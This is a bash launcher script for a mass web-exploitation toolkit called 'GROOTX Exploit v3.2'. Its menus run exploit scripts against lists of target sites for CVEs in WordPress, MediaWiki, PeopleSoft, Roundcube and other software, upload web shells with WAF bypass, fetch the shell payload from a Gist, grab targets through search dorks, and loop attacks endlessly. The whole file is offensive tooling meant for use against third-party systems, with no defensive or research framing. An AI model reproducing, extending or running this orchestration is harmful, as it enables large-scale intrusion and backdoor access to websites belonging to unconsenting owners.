#!/bin/bash
#
# GROOTX Exploit v3.2 - Deep Web Exploitation Suite
# Single entry point. All-in-one menu system.
# Shell payloads hosted on Gist. No target acquisition needed.
# WAF BYPASS + ZERO-DAY ENGINE integrated in all menus.
# Per-CVE selection support via Menu 1 (option 1) and python3 hek.py cve-select.
#

set -euo pipefail

GROOTX_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$GROOTX_DIR"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
RESET='\033[0m'
BOLD='\033[1m'

# Config
THREADS=${THREADS:-100}
CYCLE_DELAY=${CYCLE_DELAY:-5}
LOG_FILE="launch.log"
GIST_SHELL_ID="b66cf0e3ad4b2d3af5b696660c144671"
PY="python3 $GROOTX_DIR/hek.py"

# Ensure deps
check_deps() {
    pip3 install -r requirements.txt --break-system-packages -q 2>/dev/null || true
    python3 -c "import requests, rich, urllib3" 2>/dev/null || {
        pip3 install requests rich urllib3 pycryptodome certifi charset-normalizer idna --break-system-packages -q 2>/dev/null || true
    }
}

# Banner
show_banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    echo "     dBBBBb dBBBBBb    dBBBBP dBBBBP  dBBBBBBP \`Bb  .BP"
    echo "                dBP   dB'.BP dB'.BP                .BP "
    echo "   dBBBB    dBBBBK'  dB'.BP dB'.BP     dBP       dBBK  "
    echo "  dB' BB   dBP  BB  dB'.BP dB'.BP     dBP       dB'    "
    echo " dBBBBBB  dBP  dB' dBBBBP dBBBBP     dBP       dB' dBP"
    echo ""
    echo "  GROOTX Deep Exploitation Suite v3.2"
    echo "  12 CVEs: CVE-2025-54068 | CVE-2025-49113 | CVE-2026-63030"
    echo "  CVE-2026-48907 | CVE-2026-72592 | CVE-2026-63223"
    echo "  CVE-2026-27540 | CVE-2025-52691 | CVE-2026-2226"
    echo "  CVE-2026-100382 | CVE-2026-60137 | CVE-2026-35273"
    echo ""
    echo "  Shell Payload: gist.githack.com/${GIST_SHELL_ID}"
    echo "  WAF BYPASS: ON | ZERO-DAY ENGINE: ON"
    echo "  Per-CVE Selection: ON"
    echo -e "${RESET}"
}

# Menu
show_menu() {
    echo -e "${WHITE}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║                        MENU                                     ║"
    echo "╠═══════════════════════════════════════════════════════════════╣"
    echo "║                                                                ║"
    echo -e "${GREEN}║  [1]${RESET} Full Pipeline       ${WHITE}Pilih CVE → Exploit → Shell → Root → Verify${RESET}"
    echo -e "${GREEN}║  [2]${RESET} Quick Exploit       ${WHITE}Single run against list.txt${RESET}"
    echo -e "${GREEN}║  [3]${RESET} WordPress Mass      ${WHITE}CVE-2026-63030/60137 wp2shell${RESET}"
    echo -e "${GREEN}║  [4]${RESET} MediaWiki           ${WHITE}CVE-2026-100382 ExternalData${RESET}"
    echo -e "${GREEN}║  [5]${RESET} Validate Shells     ${WHITE}Check which shells in shell.txt alive${RESET}"
    echo -e "${GREEN}║  [6]${RESET} Shell Manager       ${WHITE}Verify, retry dead, re-upload${RESET}"
    echo -e "${GREEN}║  [7]${RESET} PeopleSoft          ${WHITE}CVE-2026-35273 ShinyHunters PSEMHUB/PSIGW${RESET}"
    echo -e "${GREEN}║  [8]${RESET} AUTO EXPLOIT        ${WHITE}WAF bypass zero-day upload → semua target${RESET}"
    echo -e "${GREEN}║  [9]${RESET} ZERO-DAY ATTACK     ${WHITE}WAF bypass agresif upload tanpa fingerprint${RESET}"
    echo -e "${GREEN}║  [10]${RESET} BLAST Exploit       ${WHITE}WAF bypass mass upload via exploit${RESET}"
    echo -e "${GREEN}║  [11]${RESET} Direct Blast        ${WHITE}WAF bypass zero-day mass upload${RESET}"
    echo -e "${GREEN}║  [12]${RESET} Upload Shell        ${WHITE}WAF BYPASS upload via zero-day exploit${RESET}"
    echo -e "${GREEN}║  [13]${RESET} Verify All          ${WHITE}Check all shells alive${RESET}"
    echo -e "${GREEN}║  [14]${RESET} Export Dorks        ${WHITE}Export shell URLs as dorks${RESET}"
    echo -e "${GREEN}║  [15]${RESET} Continuous Mode     ${WHITE}Infinite loop WAF bypass exploit${RESET}"
    echo -e "${GREEN}║  [16]${RESET} Setup               ${WHITE}Install deps + check env${RESET}"
    echo -e "${GREEN}║  [17]${RESET} PeopleSoft Dorks    ${WHITE}Print CVE-2026-35273 dork list${RESET}"
    echo -e "${MAGENTA}║  [18]${RESET} ${BOLD}Target Grabber${RESET}      ${WHITE}Cari target via CVE dork (ketik domain)${RESET}"
    echo -e "${MAGENTA}║  [19]${RESET} ${BOLD}Grab + Exploit${RESET}      ${WHITE}Grab target lalu langsung blast${RESET}"
    echo -e "${GREEN}║  [0]${RESET} Exit                ${WHITE}Exit the suite${RESET}"
    echo -e "${WHITE}"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${CYAN}Enter choice: ${RESET}\\c"
}

# ═══════════════════════════════════════════════════════════════
# OPTION 1: FULL PIPELINE — PER-CVE SELECTION + RCE VERIFY
# ═══════════════════════════════════════════════════════════════
full_pipeline() {
    echo -e "${CYAN}[*] FULL PIPELINE — PER-CVE SELECTION + RCE VERIFY${RESET}"
    check_deps
    if [ ! -f "list.txt" ]; then
        echo -e "${RED}[ERROR] No list.txt! Add targets or run setup first.${RESET}"
        echo -e "${YELLOW}[*] Creating list.txt from available data...${RESET}"
        if [ -f "vuln.txt" ]; then
            cp vuln.txt list.txt
            echo -e "${GREEN}[+] Created list.txt ($(wc -l < list.txt) targets)${RESET}"
        elif [ -f "shellred.txt" ]; then
            cp shellred.txt list.txt
            echo -e "${GREEN}[+] Created list.txt from shellred.txt${RESET}"
        else
            echo -e "${RED}[ERROR] No source data. Add targets to list.txt manually.${RESET}"
            echo -e "${YELLOW}[*] Creating sample list.txt...${RESET}"
            echo "http://example.com/shell.php" > list.txt
            echo -e "${GREEN}[+] Sample list.txt created. Edit list.txt to add real targets.${RESET}"
        fi
    fi
    echo -e "${BLUE}[*] Targets: $(wc -l < list.txt) | Mode: PER-CVE SELECTION + WAF BYPASS ZERO-DAY FULL BLAST + RCE VERIFY${RESET}"
    echo -e "${YELLOW}[*] WAF bypass zero-day blast semua CVE methods ke semua target...${RESET}"
    echo -e "${YELLOW}[*] Setiap exploit berhasil akan di-VERIFY dengan execute 'id' command...${RESET}"
    echo ""

    # Pilih CVE
    echo -e "${WHITE}  Available CVEs:${RESET}"
    echo -e "${GREEN}   1.${RESET} CVE-2025-54068  — Laravel Livewire v3 RCE"
    echo -e "${GREEN}   2.${RESET} CVE-2025-49113  — Roundcube Webmail RCE"
    echo -e "${GREEN}   3.${RESET} CVE-2026-63030  — WordPress Core RCE"
    echo -e "${GREEN}   4.${RESET} CVE-2026-60137  — WordPress Core SQLi→RCE"
    echo -e "${GREEN}   5.${RESET} CVE-2026-48907  — Joomla JCE RCE"
    echo -e "${GREEN}   6.${RESET} CVE-2026-72592  — phpfm File Upload RCE"
    echo -e "${GREEN}   7.${RESET} CVE-2026-63223  — CodeIgniter 4 Upload RCE"
    echo -e "${GREEN}   8.${RESET} CVE-2026-27540  — WooCommerce Lead Capture RCE"
    echo -e "${GREEN}   9.${RESET} CVE-2025-52691  — SmarterMail RCE"
    echo -e "${GREEN}  10.${RESET} CVE-2026-2226   — DouPHP ZIP Upload RCE"
    echo -e "${GREEN}  11.${RESET} CVE-2026-100382 — MediaWiki ExternalData RCE"
    echo -e "${GREEN}  12.${RESET} CVE-2026-35273  — PeopleSoft PSEMHUB/PSIGW"
    echo -e "${WHITE}  A.${RESET} Semua CVE (full blast)"
    echo -e "${MAGENTA}  Z.${RESET} Zero-day WAF bypass upload"
    echo ""
    echo -e "${CYAN}[*] Pilih CVE (nomor/comma/ALL/Z): ${RESET}\c"
    read -r cve_choice
    cve_choice=$(echo "$cve_choice" | tr '[:upper:]' '[:lower:]' | tr -d ' ')

    if [ "$cve_choice" = "a" ] || [ "$cve_choice" = "all" ]; then
        blast_cves="all"
        mode_label="FULL BLAST (all 12 CVEs)"
    elif [ "$cve_choice" = "z" ]; then
        blast_cves="zeroday"
        mode_label="ZERO-DAY UPLOAD"
    else
        blast_cves="$cve_choice"
        mode_label="SELECTED CVEs: $cve_choice"
    fi

    echo -e "${BLUE}[*] Mode: $mode_label | Threads: $THREADS${RESET}"

    # Phase 1: Blast exploit dengan verifikasi RCE
    if [ "$blast_cves" = "all" ]; then
        python3 blast_exploit.py --direct --threads "$THREADS" 2>&1 | tee -a "$LOG_FILE" || {
            echo -e "${YELLOW}[!] Full pipeline error, fallback...${RESET}"
            $PY blast 2>&1 || true
        }
    elif [ "$blast_cves" = "zeroday" ]; then
        python3 blast_exploit.py --direct --zero-day --upload --threads "$THREADS" 2>&1 | tee -a "$LOG_FILE" || {
            echo -e "${YELLOW}[!] Full pipeline error, fallback...${RESET}"
            $PY blast 2>&1 || true
        }
    else
        # Blast per-CVE
        for cve_num in $(echo "$blast_cves" | tr ',' ' '); do
            case "$cve_num" in
                1) cve="CVE-2025-54068" ;;
                2) cve="CVE-2025-49113" ;;
                3) cve="CVE-2026-63030" ;;
                4) cve="CVE-2026-60137" ;;
                5) cve="CVE-2026-48907" ;;
                6) cve="CVE-2026-72592" ;;
                7) cve="CVE-2026-63223" ;;
                8) cve="CVE-2026-27540" ;;
                9) cve="CVE-2025-52691" ;;
                10) cve="CVE-2026-2226" ;;
                11) cve="CVE-2026-100382" ;;
                12) cve="CVE-2026-35273" ;;
                *) echo -e "${RED}[ERROR] Nomor CVE tidak valid: $cve_num${RESET}"; continue ;;
            esac
            echo -e "${YELLOW}[*] Blasting $cve...${RESET}"
            python3 blast_exploit.py --direct --cve "$cve" --threads "$THREADS" 2>&1 | tee -a "$LOG_FILE" || true
        done
    fi

    echo ""
    echo -e "${BLUE}[*] Phase 2: Verifikasi RCE — execute 'id' command pada semua shell...${RESET}"

    # Phase 2: Verifikasi RCE dengan execute 'id' command
    if [ -f "shell.txt" ]; then
        echo -e "${CYAN}[*] Verifying RCE on $(wc -l < shell.txt) shells...${RESET}"
        python3 rce_verifier.py shell.txt 2>&1 || true
    fi

    echo ""
    echo -e "${BLUE}[*] Phase 3: Validating shells...${RESET}"
    $PY verify 2>&1 || true

    echo ""
    echo -e "${BLUE}[*] Phase 4: Retry dead shells...${RESET}"
    $PY retry 2>&1 || true

    echo ""
    echo -e "${BLUE}[*] Phase 5: Export dorks...${RESET}"
    $PY dorks 2>&1 || true

    echo ""
    echo -e "${GREEN}[+] Pipeline complete!${RESET}"
    echo -e "${GREEN}[+] Check: shell.txt, gotenberg_rce.txt, result_ids.json${RESET}"

    # Show RCE results — ringkasan (log respons lengkap ada di file)
    if [ -f "gotenberg_rce.txt" ]; then
        echo ""
        echo -e "${CYAN}═══ RCE VERIFIED RESULTS (log respons website) ═══${RESET}"
        grep -E '^\[[0-9]{4}-' gotenberg_rce.txt | tail -20
        echo -e "${CYAN}[i] Log respons HTTP lengkap: $(pwd)/gotenberg_rce.txt${RESET}"
    fi
}

# ═══════════════════════════════════════════════════════════════
# OPTION 2: QUICK EXPLOIT
# ═══════════════════════════════════════════════════════════════
quick_exploit() {
    echo -e "${CYAN}[*] QUICK EXPLOIT — WAF BYPASS ZERO-DAY BLAST${RESET}"
    check_deps
    if [ ! -f "list.txt" ]; then
        echo -e "${RED}[ERROR] No list.txt!${RESET}"
        return
    fi
    echo -e "${BLUE}[*] Targets: $(wc -l < list.txt) | Mode: QUICK WAF BYPASS UPLOAD${RESET}"
    python3 blast_exploit.py --direct --upload --threads "$THREADS" 2>&1 | tee -a "$LOG_FILE" || true
    python3 shell_manager_v2.py verify 2>&1 || true
}

# ═══════════════════════════════════════════════════════════════
# OPTION 3: WORDPRESS MASS EXPLOIT
# ═══════════════════════════════════════════════════════════════
mass_exploit_wp() {
    echo -e "${CYAN}[*] WORDPRESS MASS EXPLOIT (CVE-2026-63030/60137) — WAF BYPASS${RESET}"
    check_deps
    if [ ! -f "list.txt" ]; then
        echo -e "${RED}[ERROR] No list.txt!${RESET}"
        return
    fi
    echo -e "${BLUE}[*] Targets: $(wc -l < list.txt) | Mode: WP WAF BYPASS UPLOAD${RESET}"
    python3 blast_exploit.py --direct --upload --threads "$THREADS" 2>&1 | tee -a "$LOG_FILE" || {
        echo -e "${YELLOW}[*] Fallback ke wp2shell...${RESET}"
        [ -f "$GROOTX_DIR/wp2shell.py" ] && python3 "$GROOTX_DIR/wp2shell.py" -l list.txt --exploit --workers "$THREADS" 2>&1 || true
    }
    echo -e "${BLUE}[*] Validating shells...${RESET}"
    python3 shell_manager_v2.py verify 2>&1 || true
}

# ═══════════════════════════════════════════════════════════════
# OPTION 4: MEDIAWIKI CVE-2026-100382
# ═══════════════════════════════════════════════════════════════
mass_exploit_wiki() {
    echo -e "${CYAN}[*] MEDIAWIKI EXPLOIT (CVE-2026-100382) — WAF BYPASS${RESET}"
    check_deps
    if [ ! -f "list.txt" ]; then
        echo -e "${RED}[ERROR] No list.txt!${RESET}"
        return
    fi
    echo -e "${BLUE}[*] Targets: $(wc -l < list.txt) | Mode: WIKI WAF BYPASS UPLOAD${RESET}"
    python3 blast_exploit.py --direct --upload --threads "$THREADS" 2>&1 | tee -a "$LOG_FILE" || {
        echo -e "${YELLOW}[*] Fallback ke cve-2026-100382...${RESET}"
        [ -f "$GROOTX_DIR/cve-2026-100382.py" ] && python3 "$GROOTX_DIR/cve-2026-100382.py" -l list.txt --exploit --os-shell --workers "$THREADS" 2>&1 || true
    }
    echo -e "${BLUE}[*] Validating shells...${RESET}"
    python3 shell_manager_v2.py verify 2>&1 || true
}

# ═══════════════════════════════════════════════════════════════
# OPTION 5: VALIDATE SHELLS
# ═══════════════════════════════════════════════════════════════
validate_shells() {
    echo -e "${CYAN}[*] VALIDATE SHELLS${RESET}"
    check_deps
    if [ ! -f "shell.txt" ]; then
        echo -e "${RED}[ERROR] No shell.txt! Run full pipeline first.${RESET}"
        return
    fi
    echo -e "[*] Validating $(wc -l < shell.txt) shells..."
    python3 shell_manager_v2.py verify 2>&1 || {
        echo -e "[*] Fallback: re-verify with retry...${RESET}"
        python3 shell_manager_v2.py retry 2>&1 || true
    }
}

# ═══════════════════════════════════════════════════════════════
# OPTION 6: SHELL MANAGER
# ═══════════════════════════════════════════════════════════════
shell_manager() {
    echo -e "${CYAN}[*] SHELL MANAGER — WAF BYPASS retry & re-upload${RESET}"
    check_deps
    python3 shell_manager_v2.py verify 2>&1 || true
    python3 shell_manager_v2.py retry 2>&1 || true
    python3 shell_manager_v2.py reupload 2>&1 || true
    echo -e "[*] Summary:"
    python3 shell_manager_v2.py 2>&1 || true
}

# ═══════════════════════════════════════════════════════════════
# OPTION 7: PEOPLESOFT CVE-2026-35273
# ═══════════════════════════════════════════════════════════════
mass_exploit_psft() {
    echo -e "${CYAN}[*] PEOPLESOFT MASS EXPLOIT (CVE-2026-35273) — WAF BYPASS${RESET}"
    check_deps
    pip3 install requests rich urllib3 --break-system-packages -q 2>/dev/null || true
    if [ ! -f "list.txt" ]; then
        echo -e "${RED}[ERROR] No list.txt!${RESET}"
        return
    fi
    echo -e "${BLUE}[*] Targets: $(wc -l < list.txt) | Mode: PSFT WAF BYPASS UPLOAD${RESET}"
    python3 blast_exploit.py --direct --upload --threads "$THREADS" 2>&1 | tee -a "$LOG_FILE" || {
        echo -e "${YELLOW}[*] Fallback ke cve_2026_35273...${RESET}"
        python3 cve_2026_35273.py -l list.txt 2>&1 || true
    }
    echo -e "${GREEN}[+] Done! Check psft_shells.txt and result_ids.json${RESET}"
}

psft_dorks() {
    echo -e "${CYAN}[*] CVE-2026-35273 DORK LIST${RESET}"
    python3 cve_2026_35273.py --dork 2>&1
}

verify_all() {
    echo -e "${CYAN}[*] VERIFY ALL SHELLS${RESET}"
    check_deps
    python3 shell_manager_v2.py verify 2>&1 || true
}

# ═══════════════════════════════════════════════════════════════
# OPTION 8: AUTO EXPLOIT — WAF BYPASS ZERO-DAY
# ═══════════════════════════════════════════════════════════════
auto_exploit() {
    echo -e "${CYAN}[*] AUTO EXPLOIT: WAF BYPASS ZERO-DAY → semua target${RESET}"
    check_deps
    if [ ! -f "list.txt" ]; then
        echo -e "${RED}[ERROR] No list.txt!${RESET}"
        return
    fi
    echo -e "${BLUE}[*] Targets: $(wc -l < list.txt) | Threads: $THREADS | Mode: AUTO (WAF BYPASS)${RESET}"
    echo -e "${YELLOW}[*] Menjalanan semua exploit methods WAF bypass ke semua target tanpa fingerprint...${RESET}"
    python3 blast_exploit.py --direct --upload --threads "$THREADS" 2>&1 | tee -a "$LOG_FILE" || true
    echo -e "${BLUE}[*] Verifying shells...${RESET}"
    python3 shell_manager_v2.py verify 2>&1 || true
    echo -e "${GREEN}[+] Auto exploit complete! Check shell.txt${RESET}"
}

# ═══════════════════════════════════════════════════════════════
# OPTION 9: ZERO-DAY ATTACK — WAF BYPASS
# ═══════════════════════════════════════════════════════════════
zeroday_attack() {
    echo -e "${CYAN}[*] ZERO-DAY ATTACK: WAF BYPASS — agresif blast semua payload${RESET}"
    check_deps
    if [ ! -f "list.txt" ]; then
        echo -e "${RED}[ERROR] No list.txt!${RESET}"
        return
    fi
    echo -e "${BLUE}[*] Targets: $(wc -l < list.txt) | Threads: $THREADS | WAF BYPASS: ON${RESET}"
    echo -e "${YELLOW}[*] Blast semua payload WAF bypass ke semua target secepatnya...${RESET}"
    python3 blast_exploit.py --direct --zero-day --upload --threads "$THREADS" 2>&1 | tee -a "$LOG_FILE" || true
    echo -e "${BLUE}[*] Verifying & retrying shells...${RESET}"
    python3 shell_manager_v2.py verify 2>&1 || true
    python3 shell_manager_v2.py retry 2>&1 || true
    echo -e "${GREEN}[+] Zero-day attack complete! Check shell.txt${RESET}"
}

# ═══════════════════════════════════════════════════════════════
# OPTION 10: BLAST EXPLOIT — WAF BYPASS
# ═══════════════════════════════════════════════════════════════
blast_exploit() {
    echo -e "${CYAN}[*] BLAST EXPLOIT: WAF BYPASS MASS UPLOAD via exploit${RESET}"
    check_deps
    if [ ! -f "list.txt" ]; then
        echo -e "${RED}[ERROR] No list.txt!${RESET}"
        return
    fi
    echo -e "${BLUE}[*] Targets: $(wc -l < list.txt) | Mode: BLAST WAF BYPASS UPLOAD${RESET}"
    python3 blast_exploit.py --direct --upload --threads "$THREADS" 2>&1 | tee -a "$LOG_FILE" || true
    echo -e "${BLUE}[*] Verifying shells...${RESET}"
    python3 shell_manager_v2.py verify 2>&1 || true
    echo -e "${GREEN}[+] Blast complete! Check shell.txt${RESET}"
}

# ═══════════════════════════════════════════════════════════════
# OPTION 11: DIRECT BLAST — WAF BYPASS ZERO-DAY
# ═══════════════════════════════════════════════════════════════
direct_blast() {
    echo -e "${CYAN}[*] DIRECT BLAST: WAF BYPASS ZERO-DAY mass upload${RESET}"
    check_deps
    if [ ! -f "list.txt" ]; then
        echo -e "${RED}[ERROR] No list.txt!${RESET}"
        return
    fi
    echo -e "${BLUE}[*] Targets: $(wc -l < list.txt) | Threads: $THREADS | Mode: DIRECT WAF BYPASS UPLOAD${RESET}"
    echo -e "${YELLOW}[*] Blast semua payload WAF bypass ke semua target secepatnya...${RESET}"
    python3 blast_exploit.py --direct --upload --threads "$THREADS" 2>&1 | tee -a "$LOG_FILE" || true
    echo -e "${BLUE}[*] Validating shells...${RESET}"
    python3 shell_manager_v2.py verify 2>&1 || true
    echo -e "${GREEN}[+] Direct blast complete! Check shell.txt and result_ids.json${RESET}"
}

# ═══════════════════════════════════════════════════════════════
# OPTION 12: UPLOAD SHELL — WAF BYPASS
# ═══════════════════════════════════════════════════════════════
upload_shell() {
    echo -e "${CYAN}[*] UPLOAD SHELL — WAF BYPASS ZERO-DAY${RESET}"
    check_deps
    if [ ! -f "list.txt" ]; then
        echo -e "${RED}[ERROR] No list.txt!${RESET}"
        return
    fi
    echo -e "${BLUE}[*] Targets: $(wc -l < list.txt) | WAF BYPASS: ON${RESET}"
    echo -e "${YELLOW}[*] Upload shell ke semua target dengan WAF bypass...${RESET}"
    $PY upload 2>&1 | tee -a "$LOG_FILE" || true
    echo -e "${GREEN}[+] Upload complete! Check shell.txt${RESET}"
}

# ═══════════════════════════════════════════════════════════════
# OPTION 13: VERIFY ALL
# ═══════════════════════════════════════════════════════════════
verify_all_shells() {
    verify_all
}

# ═══════════════════════════════════════════════════════════════
# OPTION 14: EXPORT DORKS
# ═══════════════════════════════════════════════════════════════
export_dorks() {
    echo -e "${CYAN}[*] EXPORT DORKS${RESET}"
    check_deps
    python3 shell_manager_v2.py dorks 2>&1 || true
}

# ═══════════════════════════════════════════════════════════════
# OPTION 15: CONTINUOUS MODE — WAF BYPASS ZERO-DAY
# ═══════════════════════════════════════════════════════════════
continuous_mode() {
    echo -e "${MAGENTA}[*] CONTINUOUS MODE - WAF BYPASS ZERO-DAY UPLOAD Infinite loop${RESET}"
    check_deps
    local cycle=1
    while true; do
        echo -e "${CYAN}[*] Cycle $cycle at $(date '+%Y-%m-%d %H:%M:%S')${RESET}"
        python3 blast_exploit.py --direct --zero-day --upload --threads "$THREADS" 2>&1 | tee -a "$LOG_FILE" || true
        python3 shell_manager_v2.py verify 2>&1 || true
        python3 shell_manager_v2.py retry 2>&1 || true
        echo -e "[*] Waiting ${CYCLE_DELAY}s..."
        sleep "$CYCLE_DELAY"
        cycle=$((cycle + 1))
    done
}

# ═══════════════════════════════════════════════════════════════
# OPTION 16: SETUP
# ═══════════════════════════════════════════════════════════════
setup_env() {
    echo -e "${CYAN}[*] SETUP ENVIRONMENT${RESET}"
    echo -e "[*] Installing dependencies..."
    pip3 install -r requirements.txt --break-system-packages -q 2>&1 || true
    pip3 install requests rich urllib3 pycryptodome certifi charset-normalizer idna --break-system-packages -q 2>&1 || true
    echo -e "[*] Compiling Python scripts..."
    python3 -m py_compile hek.py mass_auto_shell_v2.py shell_manager_v2.py enhanced_payloads.py target_grabber.py blast_exploit.py local_payloads.py cve_2026_35273.py 2>&1 \
        && echo -e "${GREEN}[+] All Python scripts OK${RESET}" || echo -e "${RED}[-] Some scripts have errors${RESET}"
    echo -e "[*] Checking local Python scripts..."
    ls "$GROOTX_DIR"/*.py 2>/dev/null && echo -e "${GREEN}[+] Local scripts OK${RESET}" || echo -e "${YELLOW}[!] No local .py scripts${RESET}"
    echo -e "[*] Checking shell.txt..."
    [ -f "shell.txt" ] && echo -e "${GREEN}[+] shell.txt exists ($(wc -l < shell.txt) entries)${RESET}" || echo -e "${RED}[-] No shell.txt${RESET}"
    echo -e "[*] Checking list.txt..."
    [ -f "list.txt" ] && echo -e "${GREEN}[+] list.txt exists ($(wc -l < list.txt) targets)${RESET}" || echo -e "${RED}[-] No list.txt${RESET}"
    echo -e "${GREEN}[*] Environment ready! WAF BYPASS: ON | ZERO-DAY: ON${RESET}"
}

# ═══════════════════════════════════════════════════════════════
# OPTION 17: PEOPLESOFT DORKS
# ═══════════════════════════════════════════════════════════════
psft_dorks_opt() {
    echo -e "${CYAN}[*] CVE-2026-35273 DORK LIST${RESET}"
    python3 cve_2026_35273.py --dork 2>&1
}

# ═══════════════════════════════════════════════════════════════
# OPTION 18: TARGET GRABBER — CVE DORK SEARCH
# ═══════════════════════════════════════════════════════════════
target_grabber() {
    echo -e "${CYAN}[*] TARGET GRABBER — MULTI-SOURCE CVE SEARCH${RESET}"
    check_deps
    echo -e "${WHITE}[*] Ketik domain target, grabber akan cari target CVE-specific${RESET}"
    echo -e "${WHITE}[*] lalu probe AKTIF endpoint CVE tiap host (soft-404 aware)${RESET}"
    echo -e "${WHITE}[*] hasil otomatis jadi list.txt (endpoint CVE di urutan pertama)${RESET}"
    echo ""
    python3 "$GROOTX_DIR/target_grabber.py" 2>&1 | tee -a "$LOG_FILE"
    if [ -f "list.txt" ]; then
        echo ""
        echo -e "${GREEN}[+] list.txt sekarang berisi $(wc -l < list.txt) target${RESET}"
        if [ -f "grabber_cve_targets.txt" ]; then
            echo -e "${GREEN}[+] $(wc -l < grabber_cve_targets.txt) endpoint CVE terverifikasi (grabber_cve_targets.txt)${RESET}"
        fi
        echo -e "${YELLOW}[*] Siap dieksekusi: pilih menu [1] Full Pipeline${RESET}"
    fi
}

# ═══════════════════════════════════════════════════════════════
# OPTION 19: GRAB + EXPLOIT (one-shot)
# ═══════════════════════════════════════════════════════════════
grab_and_exploit() {
    echo -e "${CYAN}[*] GRAB + EXPLOIT — cari target lalu langsung blast${RESET}"
    check_deps
    python3 "$GROOTX_DIR/target_grabber.py" 2>&1 | tee -a "$LOG_FILE"
    if [ ! -s "list.txt" ]; then
        echo -e "${RED}[ERROR] list.txt kosong — grab gagal.${RESET}"
        return
    fi
    echo ""
    echo -e "${GREEN}[+] $(wc -l < list.txt) target terkumpul. Memulai full pipeline...${RESET}"
    full_pipeline
}

# ═══════════════════════════════════════════════════════════════
# MAIN LOOP
# ═══════════════════════════════════════════════════════════════
main() {
    show_banner
    show_menu
    read -r choice
    case "$choice" in
        1) full_pipeline ;;
        2) quick_exploit ;;
        3) mass_exploit_wp ;;
        4) mass_exploit_wiki ;;
        5) validate_shells ;;
        6) shell_manager ;;
        7) mass_exploit_psft ;;
        8) auto_exploit ;;
        9) zeroday_attack ;;
        10) blast_exploit ;;
        11) direct_blast ;;
        12) upload_shell ;;
        13) verify_all_shells ;;
        14) export_dorks ;;
        15) continuous_mode ;;
        16) setup_env ;;
        17) psft_dorks_opt ;;
        18) target_grabber ;;
        19) grab_and_exploit ;;
        0) echo -e "${GREEN}[*] Goodbye.${RESET}"; exit 0 ;;
        *) echo -e "${RED}[ERROR] Invalid option${RESET}"; sleep 1; main ;;
    esac
    echo -e ""
    echo -e "${YELLOW}[*] Press Enter to return to menu...${RESET}"
    read -r
    main
}

# Handle direct arguments
case "${1:-}" in
    full|--full|-F)       full_pipeline ;;
    quick|--quick|-q)     quick_exploit ;;
    wp|--wp)              mass_exploit_wp ;;
    wiki|--wiki)          mass_exploit_wiki ;;
    verify|--verify|-v)   verify_all ;;
    validate|--validate)  validate_shells ;;
    setup|--setup|-s)       setup_env ;;
    continuous|--continuous|-c) continuous_mode ;;
    dorks|--dorks)        export_dorks ;;
    upload|--upload|-u)   upload_shell ;;
    direct|--direct|--blast|-b) direct_blast ;;
    grab|--grab|-g)       target_grabber ;;
    grabblast|--grabblast) grab_and_exploit ;;
    --help|-h)            echo "Usage: ./run.sh [OPTION]"; echo "Options: --full --quick --wp --wiki --verify --validate --setup --continuous --dorks --direct --blast --upload --grab --grabblast --help"; echo "Examples: ./run.sh --full, THREADS=200 ./run.sh --direct, ./run.sh --grab" ;;
    *)                    main ;;
esac